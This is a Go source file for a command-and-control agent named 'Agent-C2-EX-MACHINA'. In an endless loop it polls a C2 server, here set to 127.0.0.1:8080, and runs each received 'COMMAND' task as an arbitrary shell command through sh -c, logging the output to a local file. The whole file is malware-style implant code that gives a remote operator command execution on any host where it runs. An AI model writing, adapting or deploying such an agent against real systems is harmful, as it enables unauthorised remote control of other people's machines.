package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"time"
)

type Task struct {
	Type        string `json:"Type"`
	User        string `json:"User"`
	Name        string `json:"Name"`
	Description string `json:"Description"`
	Data        string `json:"Data"`
	Timestamp   string `json:"Timestamp"`
	Id          string `json:"Id"`
	After       string `json:"After"`
}

type Request struct {
	NextRequestTime string `json:"NextRequestTime"`
	Tasks           []Task `json:"Tasks"`
}

func main() {
	hostname, _ := os.Hostname()
	agentVersion := "1.0.0"
	system := "Linux"

	// Set up logging to a file
	logFile, err := os.OpenFile("agent.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatalf("Failed to open log file: %v", err)
	}
	defer logFile.Close()
	logger := log.New(logFile, "", log.LstdFlags)

	for {
		// Create a request to retrieve tasks from the C2 server
		request := Request{
			NextRequestTime: time.Now().Format(time.RFC3339),
			Tasks:           []Task{},
		}
		requestBody, err := json.Marshal(request)
		if err != nil {
			logger.Printf("Error marshalling request: %v\n", err)
			continue
		}

		// Send the request to the C2 server
		client := &http.Client{}
		req, err := http.NewRequest("POST", "http://127.0.0.1:8080/", bytes.NewBuffer(requestBody))
		if err != nil {
			logger.Printf("Error creating request: %v\n", err)
			continue
		}
		req.Header.Add("User-Agent", fmt.Sprintf("Agent-C2-EX-MACHINA %s (%s) %s", agentVersion, system, hostname))
		req.Header.Add("Content-Type", "application/json")
		resp, err := client.Do(req)
		if err != nil {
			logger.Printf("Error sending request: %v\n", err)
			continue
		}
		defer resp.Body.Close()

		// Read the response and execute the received tasks
		responseBody, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			logger.Printf("Error reading response body: %v\n", err)
			continue
		}

		var response Request
		err = json.Unmarshal(responseBody, &response)
		if err != nil {
			logger.Printf("Error unmarshalling response: %v\n", err)
			continue
		}

		for _, task := range response.Tasks {
			switch task.Type {
			case "COMMAND":
				output, err := exec.Command("sh", "-c", task.Data).CombinedOutput()
				if err != nil {
					logger.Printf("Error executing command: %v\n", err)
					continue
				}
				logger.Printf("Command output: %s", output)
			default:
				logger.Printf("Unknown task type: %s\n", task.Type)
				continue
			}
		}

		// Wait 30 seconds before retrieving new tasks
		time.Sleep(30 * time.Second)
	}
}
